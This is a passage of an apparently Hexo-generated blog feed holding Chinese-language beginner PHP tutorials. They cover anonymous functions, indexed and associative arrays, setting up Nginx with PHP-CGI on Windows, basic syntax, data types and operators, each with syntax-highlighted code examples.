class="subst">$name</span>&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 步骤2：通过变量名调用匿名函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$greet</span>(<span class="string">&quot;World&quot;</span>); <span class="comment">// 输出：Hello World</span></span><br></pre></td></tr></table></figure><ul><li><strong>匿名函数核心解析</strong><ul><li><strong>匿名</strong>：<ul><li>普通函数：<code>function sayHello() &#123;...&#125;。</code></li><li>匿名函数：<code>function(...)&#123;...&#125;</code> （没有函数名）。</li></ul></li><li><strong>赋值给变量才能使用</strong>：<ul><li><code>$greet = function(...)&#123;...&#125;;</code></li><li>通过 <code>$greet</code> 变量来“保存”这个函数。</li></ul></li><li><strong>调用方式 &#x3D; 变量名+括号</strong>：<ul><li><code>$greet(&quot;参数&quot;)</code> 👉 像普通函数一样调用。</li></ul></li><li><strong>参数传递</strong>：<ul><li><code>$name</code> 接收传入的值（本例中接收 <code>&quot;World&quot;</code>）。</li></ul></li><li><strong>函数返回值</strong>：<ul><li><code>return &quot;Hello $name&quot;</code> 返回拼接后的字符串。</li></ul></li></ul></li></ul><h2 id="3-数组"><a href="#3-数组" class="headerlink" title="3. 数组"></a>3. 数组</h2><p>​数组指数据的组合，能够在单个变量中存储多个值。可以将数组看作一个存储数据的盒子，盒子中有很多个格子，每个格子中都可存储一个数据。</p><ul><li>数组名：盒子名</li><li>元素：格子中的数据</li><li>索引：格子的位置</li><li>长度：格子的数量</li></ul><h3 id="3-1-索引数组"><a href="#3-1-索引数组" class="headerlink" title="3.1 索引数组"></a>3.1 索引数组</h3><p>​通过索引读取数组中的元素 ：<code>$数组名[索引];</code>，索引从0开始。即数组中的第一个元素索引为0，以此类推。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cars</span>=<span class="keyword">array</span>(<span class="string">&quot;Volvo&quot;</span>,<span class="string">&quot;BMW&quot;</span>,<span class="string">&quot;Toyota&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//通过索引 读取数组中的所有元素  $数组名[索引];</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$cars</span>[0].<span class="subst">$cars</span>[1].<span class="subst">$cars</span>[2]&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-2-关联数组"><a href="#3-2-关联数组" class="headerlink" title="3.2 关联数组"></a>3.2 关联数组</h3><h4 id="3-2-1-核心概念："><a href="#3-2-1-核心概念：" class="headerlink" title="3.2.1 核心概念："></a>3.2.1 核心概念：</h4><ul><li><ol><li><strong>键值对：</strong>关联数组中的每个元素都由两个部分组成——键（key）和值（value）</li></ol></li><li><ol start="2"><li><strong>自定义键名：</strong>与索引数组使用从 0 开始的数字作为键（索引）不同，关联数组允许你使用字符串作为键名（也可以使用整数，但意义通常是自定义的）。这个键名是描述性的，代表了你要存储的值的含义。</li></ol></li><li><ol start="3"><li><strong>映射关系：</strong>你可以把关联数组想象成一个词典或一张映射表。通过一个唯一的、有意义的键，你可以快速查找、访问或修改与之关联的值。</li></ol></li></ul><h4 id="3-2-2-关联数组"><a href="#3-2-2-关联数组" class="headerlink" title="3.2.2 关联数组"></a>3.2.2 关联数组</h4><ul><li><p><strong>创建关联数组</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用 array() 语法（较旧但仍然有效）</span></span><br><span class="line"><span class="variable">$student</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;张三&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="string">&quot;major&quot;</span> =&gt; <span class="string">&quot;计算机科学&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用更简洁的 [] 语法（PHP 5.4+ 推荐）</span></span><br><span class="line"><span class="variable">$car</span> = [</span><br><span class="line">    <span class="string">&quot;make&quot;</span> =&gt; <span class="string">&quot;Toyota&quot;</span>,</span><br><span class="line">    <span class="string">&quot;model&quot;</span> =&gt; <span class="string">&quot;Camry&quot;</span>,</span><br><span class="line">    <span class="string">&quot;year&quot;</span> =&gt; <span class="number">2023</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure></li><li><p><strong>访问元素</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$student</span>[<span class="string">&quot;name&quot;</span>]; <span class="comment">// 输出：张三</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$car</span>[<span class="string">&quot;model&quot;</span>];    <span class="comment">// 输出：Camry</span></span><br></pre></td></tr></table></figure></li><li><p><strong>添加或修改元素</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$student</span>[<span class="string">&quot;grade&quot;</span>] = <span class="string">&quot;B+&quot;</span>; <span class="comment">// 添加新元素</span></span><br><span class="line"><span class="variable">$student</span>[<span class="string">&quot;age&quot;</span>] = <span class="number">21</span>;     <span class="comment">// 修改现有元素</span></span><br></pre></td></tr></table></figure></li><li><p><strong>注意：</strong></p><ol><li>键是唯一的，同一个数组中，不能有两个元素使用完全相同的键名。如果指定相同的键名，后面的值会覆盖前面的值。</li><li>键的类型可以是 整数 或 字符串，如果一个字符串键的内容恰好是一个有效的十进制整数（如 <code>&#39;123&#39;</code>），PHP 会自动将其转换为整数键（<code>123</code>）。</li><li>值的类型可以是PHP支持的任何类型。</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基础入门（一）</title>
      <link href="/2025/07/14/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2025/07/14/PHP%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP基础入门（一）"><a href="#PHP基础入门（一）" class="headerlink" title="PHP基础入门（一）"></a>PHP基础入门（一）</h1><blockquote><p>[!NOTE]</p><p>本篇文章仅用于个人交流与学习，如涉及侵权请联系站长删除！</p></blockquote><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>​PHP（Hypertext Preprocessor）是一种广泛使用的开源服务器端脚本语言，尤其适用于Web开发。</p><ul><li>PHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码。</li><li>PHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器。</li><li>PHP 文件的默认文件扩展名是 <code>.php</code>。</li></ul><p>​通过 PHP，您不再限于输出 HTML。您可以输出图像、PDF 文件，甚至 Flash 电影。您还可以输出任意的文本，比如 XHTML 和 XML。</p><h2 id="2-搭建环境"><a href="#2-搭建环境" class="headerlink" title="2. 搭建环境"></a>2. 搭建环境</h2><p>​想要学习PHP语言，我们还需要搭建一个PHP语言所需要的环境，和一个服务器（这里我们使用nginx）。</p><h3 id="2-1-下载所需软件"><a href="#2-1-下载所需软件" class="headerlink" title="2.1 下载所需软件"></a>2.1 下载所需软件</h3><ul><li><strong>Nginx：</strong>从[官网](<a href="https://nginx.org/en/download.html">nginx: download</a>)下载Windows版（选择mainline版本）</li><li><strong>PHP：</strong>从[Windows PHP](<a href="https://windows.php.net/download/">PHP For Windows: Binaries and sources Releases</a>)下载ThreadSafe版本</li></ul><h3 id="2-2-PHP安装"><a href="#2-2-PHP安装" class="headerlink" title="2.2 PHP安装"></a>2.2 PHP安装</h3><ul><li><p>将下载的PHP压缩包解压在C盘的根目录下（C:&#x2F;php）。</p></li><li><p>将 C:&#x2F;php&#x2F; 目录下的 php.ini-development 文件改为 php.ini 。</p></li><li><p>之后修改php配置文件，打开常用的扩展文件。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extension_dir</span>=<span class="string">&quot;ext&quot;</span></span><br><span class="line"><span class="attr">cgi.fix_pathinfo</span>=<span class="number">1</span></span><br><span class="line"><span class="attr">enable_dl</span>=<span class="literal">Off</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; 开启常用扩展</span></span><br><span class="line"><span class="attr">extension</span>=curl</span><br><span class="line"><span class="attr">extension</span>=gd</span><br><span class="line"><span class="attr">extension</span>=mbstring</span><br><span class="line"><span class="attr">extension</span>=mysqli</span><br><span class="line"><span class="attr">extension</span>=openssl</span><br><span class="line"><span class="attr">extension</span>=pdo_mysql</span><br><span class="line"></span><br><span class="line"><span class="comment">; 启用OPcache加速</span></span><br><span class="line"><span class="attr">zend_extension</span>=opcache</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-3-NGINX配置（nginx-conf）和启用PHP解析（FastCGI）"><a href="#2-3-NGINX配置（nginx-conf）和启用PHP解析（FastCGI）" class="headerlink" title="2.3 NGINX配置（nginx.conf）和启用PHP解析（FastCGI）"></a>2.3 NGINX配置（nginx.conf）和启用PHP解析（FastCGI）</h3><p>​将下载好的NGINX压缩包解压在合适的位置，完成后我们打开conf文件夹下的nginx.conf文件，配置以下选项。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="section">location</span> <span class="regexp">~ \.php$</span> &#123;</span><br><span class="line">        <span class="attribute">root</span>           html;</span><br><span class="line">        <span class="attribute">fastcgi_pass</span>   <span class="number">127.0.0.1:9000</span>;</span><br><span class="line">        <span class="attribute">fastcgi_index</span>  index.php;</span><br><span class="line">        <span class="attribute">fastcgi_param</span>  SCRIPT_FILENAME  <span class="variable">$document_root</span><span class="variable">$fastcgi_script_name</span>;</span><br><span class="line">        <span class="attribute">include</span>        fastcgi_params;</span><br><span class="line"></span><br><span class="line"><span class="attribute">fastcgi_read_timeout</span> <span class="number">300</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>​需要注意的是http协议的默认端口为80，如果用户的80端口已经被占用，我们在运行nginx.exe时是无法启用的，这里我们可以通过修改<code>server</code>下的监听端口<code>listen</code>来避免此问题。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">       <span class="comment"># listen       80;</span></span><br><span class="line">       <span class="attribute">listen</span>       <span class="number">5050</span>;</span><br><span class="line">       <span class="attribute">server_name</span>  localhost;</span><br></pre></td></tr></table></figure><h3 id="2-4-测试环境"><a href="#2-4-测试环境" class="headerlink" title="2.4 测试环境"></a>2.4 测试环境</h3><p>​在配置好所有环境之后我们还需要重启nginx来保证，刚刚修改的内容正常应用，在nginx目录下打开终端输入下面的指令来重启nginx。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure><p>​重启后我们访问<a href="http://localhost:5050（注意：这里的端口是我自己使用的监听端口）就可以看到我们的服务器已经启动了。">http://localhost:5050（注意：这里的端口是我自己使用的监听端口）就可以看到我们的服务器已经启动了。</a></p><p><img src="/../images/PHP/1.png" alt="1"></p><p>​接下来我们需要创建一个PHP文件来测试我们的环境是否配置成功，首先运行fast-cgi代理，在php根目录下用管理员权限打开终端，输入下面的指令。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-cgi.exe -b <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">9000</span></span><br></pre></td></tr></table></figure><ul><li><strong>注意：</strong>不要中断运行！</li></ul><p>​之后在 nginx&#x2F;html&#x2F; 目录下创建test.php文件，并输入下面的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello PHP!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>保存后进入<a href="http://localhost:5050/1.php%E3%80%82%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%88%91%E4%BB%AC%E5%B7%B2%E7%BB%8F%E8%BF%9E%E6%8E%A5%E6%88%90%E5%8A%9F%E4%BA%86%E3%80%82">http://localhost:5050/1.php。就可以看到我们已经连接成功了。</a></p><p><img src="/../images/PHP/2.png" alt="2"></p><h2 id="3-语法"><a href="#3-语法" class="headerlink" title="3. 语法"></a>3. 语法</h2><h3 id="3-1-格式"><a href="#3-1-格式" class="headerlink" title="3.1 格式"></a>3.1 格式</h3><p>​PHP脚本可以放在文件中的任何位置，脚本以<code>&lt;?php</code>开始，以<code>?&gt;</code>结束，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// PHP 代码</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>其中<code>//</code>是PHP的单行注释，要是想要多行注释则需要借助<code>/* */</code>来完成。</p><h3 id="3-2-第一个PHP程序"><a href="#3-2-第一个PHP程序" class="headerlink" title="3.2 第一个PHP程序"></a>3.2 第一个PHP程序</h3><p>​在刚刚的测试用例中我们已经演示过这个例子了:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello PHP!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="3-3-变量"><a href="#3-3-变量" class="headerlink" title="3.3 变量"></a>3.3 变量</h3><p>​变量是所有编程语言中都有的概念，是用于程序存储数据的”容器”。</p><p>PHP中通过语法：<code>$变量名 = 变量值;</code>来定义变量，PHP属于弱类型语言，所以变量声明的时候不需要设置数据类型，变量的类型取决于值得类型。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="number">3</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="number">6</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$a</span>+<span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$c</span>; <span class="comment">// 输出的结果为9</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-数据类型"><a href="#4-数据类型" class="headerlink" title="4. 数据类型"></a>4. 数据类型</h2><p>​PHP中的数据类型也分为这几大类：String（字符串）、 Integer（整型）、 Float（浮点型）、Boolean（布尔型）、 Array（数组）、Object（对象）、 NULL（空值）。</p><h3 id="4-1-字符串"><a href="#4-1-字符串" class="headerlink" title="4.1 字符串"></a>4.1 字符串</h3><p>​就像刚刚第一个程序中的<code>Hello PHP!</code>一样，一个字符串是一串字符的序列。我们可以将任何文本放在单引号和双引号中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>; </span><br><span class="line">    <span class="variable">$x</span> = <span class="string">&#x27;Hello world!&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$x</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-2-整数和浮点数"><a href="#4-2-整数和浮点数" class="headerlink" title="4.2 整数和浮点数"></a>4.2 整数和浮点数</h3><p>​<strong>整数</strong>是一个没有小数的数字。<strong>浮点数</strong>是带小数部分的数字，或是指数形式。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="number">1359</span>;</span><br><span class="line">    <span class="variable">$x</span> = -<span class="number">345</span>; <span class="comment">// 负数 </span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0x8C</span>; <span class="comment">// 十六进制数</span></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">047</span>; <span class="comment">// 八进制数 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$x</span> = <span class="number">10.365</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>); <span class="comment">// 输出float(10.365)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  <span class="comment">// 换行</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$x</span> = <span class="number">2.4e3</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>); <span class="comment">// 输出float(2400)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>注意：</strong><code>var_dump()</code>函数可以返回变量的数据类型和值。</li></ul><h3 id="4-3-布尔类型"><a href="#4-3-布尔类型" class="headerlink" title="4.3 布尔类型"></a>4.3 布尔类型</h3><p>​布尔型可以是<code>TRUE</code>或<code>FALSE</code>，<code>TRUE</code>标识真，<code>FALSE</code>标识假。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="literal">false</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-4-对象类型"><a href="#4-4-对象类型" class="headerlink" title="4.4 对象类型"></a>4.4 对象类型</h3><p>​对象类型可以用于存储数据，使用<code>class</code>关键字声明类对象，类包含属性和方法。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//类名</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;</span><br><span class="line">      <span class="comment">//属性</span></span><br><span class="line">      <span class="keyword">var</span> <span class="variable">$color</span>;</span><br><span class="line">      <span class="comment">//方法</span></span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">fun1</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;方法1&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-5-NULL值"><a href="#4-5-NULL值" class="headerlink" title="4.5 NULL值"></a>4.5 NULL值</h3><p><code>NULL</code>值表示变量没有值，<code>NULL</code> 是数据类型为 NULL 的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$x</span>=<span class="string">&quot;Hello world!&quot;</span>;</span><br><span class="line">    <span class="variable">$x</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$x</span>); <span class="comment">// 输出的结果是 NULL</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><strong>解释：</strong>这里先将字符串<code>Hello world!</code>赋值给变量<code>$x</code>，之后又将<code>$x</code>的值设置成<code>null</code>（空值），<code>null</code>类型会被直接输出为<code>NULL</code>。</li></ul><h2 id="5-运算符"><a href="#5-运算符" class="headerlink" title="5. 运算符"></a>5. 运算符</h2><h3 id="5-1-算数运算符"><a href="#5-1-算数运算符" class="headerlink" title="5.1 算数运算符"></a>5.1 算数运算符</h3><table><thead><tr><th align="center"><strong>运算符</strong></th><th align="center"><strong>名称</strong></th><th align="center"><strong>格式</strong></th></tr></thead><tbody><tr><td align="center"><code>+</code></td><td align="center">加</td><td align="center"><code>$a + $b</code></td></tr><tr><td align="center"><code>-</code></td><td align="center">减</td><td align="center"><code>$a - $b</code>或<code>-$a</code></td></tr><tr><td align="center"><code>*</code></td><td align="center">乘</td><td align="center"><code>$a * $b</code></td></tr><tr><td align="center"><code>/</code></td><td align="center">除</td><td align="center"><code>$a / $b</code>（返回浮点数）</td></tr><tr><td align="center"><code>%</code></td><td align="center">取余</td><td align="center"><code>$a % $b</code>（返回余数）</td></tr><tr><td align="center"><code>**</code></td><td align="center">幂运算</td><td align="center"><code>$a ** $b</code>（如 <code>2**3</code> 结果为 <code>8</code>）</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="number">5</span> + <span class="number">3</span>;   <span class="comment">// 输出8</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">10</span> % <span class="number">3</span>;  <span class="comment">// 输出1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">2</span> ** <span class="number">4</span>;  <span class="comment">// 输出16</span></span><br></pre></td></tr></table></figure><h3 id="5-2-赋值运算符"><a href="#5-2-赋值运算符" class="headerlink" title="5.2 赋值运算符"></a>5.2 赋值运算符</h3><table><thead><tr><th align="center"><strong>运算符</strong></th><th align="center"><strong>名称</strong></th><th align="center"><strong>格式</strong></th><th align="center"><strong>功能</strong></th></tr></thead><tbody><tr><td align="center"><code>=</code></td><td align="center">赋值运算符</td><td align="center"><code>$a = 5</code></td><td align="center">基本赋值</td></tr><tr><td align="center"><code>+=</code></td><td align="center">加法复制运算符</td><td align="center"><code>$a += 5</code></td><td align="center"><code>$a = $a + 5</code></td></tr><tr><td align="center"><code>-=</code></td><td align="center">减法复制运算符</td><td align="center"><code>$a -= 5</code></td><td align="center"><code>$a = $a - 5</code></td></tr><tr><td align="center"><code>*=</code></td><td align="center">乘法赋值运算符</td><td align="center"><code>$a *= 5</code></td><td align="center"><code>$a = $a * 5</code></td></tr><tr><td align="center"><code>/=</code></td><td align="center">除法赋值运算符</td><td align="center"><code>$a /= 5</code></td><td align="center"><code>$a = $a / 5</code></td></tr><tr><td align="center"><code>%=</code></td><td align="center">取余赋值运算符</td><td align="center"><code>$a %= 5</code></td><td align="center"><code>$a = $a % 5</code></td></tr><tr><td align="center"><code>**=</code></td><td align="center">幂运算赋值运算符</td><td align="center"><code>$a **= 5</code></td><td align="center"><code>$a = $a ** 5</code></td></tr><tr><td align="center"><code>.=</code></td><td align="center">拼接赋值运算符</td><td align="center"><code>$str .= &quot; PHP&quot;</code></td><td align="center">字符串连接</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 基本赋值</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> += <span class="number">5</span>;      <span class="comment">// $a = 15</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字符串连接</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Hi&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> .= <span class="string">&quot; PHP&quot;</span>; <span class="comment">// &quot;Hi PHP&quot;</span></span><br></pre></td></tr></table></figure><h3 id="5-3-比较运算符"><a href="#5-3-比较运算符" class="headerlink" title="5.3 比较运算符"></a>5.3 比较运算符</h3><table><thead><tr><th align="center"><strong>运算符</strong></th><th align="center"><strong>名称</strong></th></tr></thead><tbody><tr><td align="center"><code>==</code></td><td align="center">等于</td></tr><tr><td align="center"><code>===</code></td><td align="center">全等</td></tr><tr><td align="center"><code>!=</code> 或 <code>&lt;&gt;</code></td><td align="center">不等于</td></tr><tr><td align="center"><code>!==</code></td><td align="center">不全等</td></tr><tr><td align="center"><code>&gt;</code>，<code>&lt;</code>，<code>&gt;=</code>，<code>&lt;=</code></td><td align="center">大小比较</td></tr><tr><td align="center"><code>&lt;=&gt;</code></td><td align="center">太空船运算符（返回-1<code>, </code>0<code>, </code>1）</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;5&quot;</span> == <span class="number">5</span>);   <span class="comment">// true（值相同）</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&quot;5&quot;</span> === <span class="number">5</span>);  <span class="comment">// false（类型不同）</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="number">2</span> &lt;=&gt; <span class="number">3</span>);    <span class="comment">// -1（2小于3）</span></span><br></pre></td></tr></table></figure><h3 id="5-4-逻辑运算符"><a href="#5-4-逻辑运算符" class="headerlink" title="5.4 逻辑运算符"></a>5.4 逻辑运算符</h3><table><thead><tr><th align="center"><strong>运算符</strong></th><th align="center"><strong>名称</strong></th></tr></thead><tbody><tr><td align="center"><code>&amp;&amp;</code> 或 <code>and</code></td><td align="center">逻辑与</td></tr><tr><td align="center"><code>||</code> 或 <code>or</code></td><td align="center">逻辑或</td></tr><tr><td align="center"><code>!</code></td><td align="center">逻辑非</td></tr><tr><td align="center"><code>xor</code></td><td align="center">异或</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$b</span> &lt; <span class="number">10</span>) &#123; &#125;<span class="comment">/* 同时成立时触发 */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$is_valid</span>) &#123; &#125;<span class="comment">/* $is_valid为false时触发 */</span> </span><br></pre></td></tr></table></figure><h3 id="5-5-字符串运算符"><a href="#5-5-字符串运算符" class="headerlink" title="5.5 字符串运算符"></a>5.5 字符串运算符</h3><table><thead><tr><th align="center"><strong>运算符</strong></th><th align="center"><strong>功能</strong></th></tr></thead><tbody><tr><td align="center"><code>.</code></td><td align="center">连接字符串</td></tr><tr><td align="center"><code>.=</code></td><td align="center">连接并赋值</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&quot;Alice&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello &quot;</span> . <span class="variable">$name</span>; 